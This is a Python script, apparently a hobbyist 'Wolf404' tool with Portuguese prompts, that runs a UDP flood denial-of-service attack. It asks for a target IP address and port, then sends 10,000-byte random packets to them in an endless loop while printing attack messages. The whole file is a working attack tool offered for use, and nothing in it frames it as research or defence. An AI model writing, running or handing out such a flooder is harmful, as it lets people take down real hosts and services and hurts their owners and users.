import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10000)
timeout = time.time()

branco= '\033[37m'
azul= '\033[34m'
vermelho= '\033[31m'
def script():
    os.system("clear")
    time.sleep(1)
    print(branco+"⣿⣿⣿⣵⣿⣿⣿⠿⡟⣛⣧⣿⣯⣿⣝⡻⢿⣿⣿⣿⣿⣿⣿⣿")
    print("⣿⣿⣿⣿⣿⠋⠁⣴⣶⣿⣿⣿⣿⣿⣿⣿⣦⣍⢿⣿⣿⣿⣿⣿ ")
    print("⣿⣿⣿⣿⢷⠄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⢼⣿⣿⣿⣿")
    print("⢹⣿⣿⢻⠎⠔⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿")
    print("⢸⣿⣿⠇⡶⠄⣿⣿⠿⠟⡛⠛⠻⣿⡿⠿⠿⣿⣗⢣⣿⣿⣿⣿")
    print(azul+"⠐⣿⣿⡿⣷⣾⣿⣿⣿⣾⣶⣶⣶⣿⣁⣔⣤⣀⣼⢲⣿⣿⣿⣿")
    print("⠄⣿⣿⣿⣿⣾⣟⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⢟⣾⣿⣿⣿⣿ ")
    print("⠄⣟⣿⣿⣿⡷⣿⣿⣿⣿⣿⣮⣽⠛⢻⣽⣿⡇⣾⣿⣿⣿⣿⣿ ")
    print("⠄⢻⣿⣿⣿⡷⠻⢻⡻⣯⣝⢿⣟⣛⣛⣛⠝⢻⣿⣿⣿⣿⣿⣿ ")
    print("⠄⠸⣿⣿⡟⣹⣦⠄⠋⠻⢿⣶⣶⣶⡾⠃⡂⢾⣿⣿⣿⣿⣿⣿")
    print(vermelho+"⠄⠄⠟⠋⠄⢻⣿⣧⣲⡀⡀⠄⠉⠱⣠⣾⡇⠄⠉⠛⢿⣿⣿⣿")
    print("⠄⠄⠄⠄⠄⠈⣿⣿⣿⣷⣿⣿⢾⣾⣿⣿⣇⠄⠄⠄⠄⠄⠉⠉")
    print("⠄⠄⠄⠄⠄⠄⠸⣿⣿⠟⠃⠄⠄⢈⣻⣿⣿⠄⠄⠄⠄⠄⠄⠄")
    print("⠄⠄⠄⠄⠄⠄⠄⢿⣿⣾⣷⡄⠄⢾⣿⣿⣿⡄⠄⠄⠄⠄⠄⠄") 
    print("⠄⠄⠄⠄⠄⠄⠄⠸⣿⣿⣿⠃⠄⠈⢿⣿⣿⠄⠄⠄⠄⠄⠄⠄")
    time.sleep(1)
    print("\n")
    print (azul+"░█▀█░█░█░▀█▀░▀█▀░█▀█░░░▀█▀░█▀█")
    print("░█▀▀░█░█░░█░░░█░░█░█░░░░█░░█▀▀")
    print("░▀░░░▀▀▀░░▀░░▀▀▀░▀░▀░░░▀▀▀░▀░░")
    time.sleep(1)
    print("\n")
    print(vermelho+"Criado por "+azul+"Wolf404")
    time.sleep(1)
    print(vermelho+"Bem vindo ao script de derrubar Ip!")
    print("\n")
    ip = input("Digite o endereço de ip: "+azul)
    port = int(input("Digite a porta: "+azul))
    time.sleep(1)
    print(vermelho+"Para parar o ataque, aperte"+azul+" ctrl+c")
    print("Ataque iniciado...")
    while True:
           while 1:
                 if time.time() > timeout:
                      break
                 else:
                         pass
           sock.sendto(bytes, (ip, port))
           print (" [ ? ] ATTACKING SEND DOS BY: WOLF404 ")
           if port == 65500:
            port = 1
script()
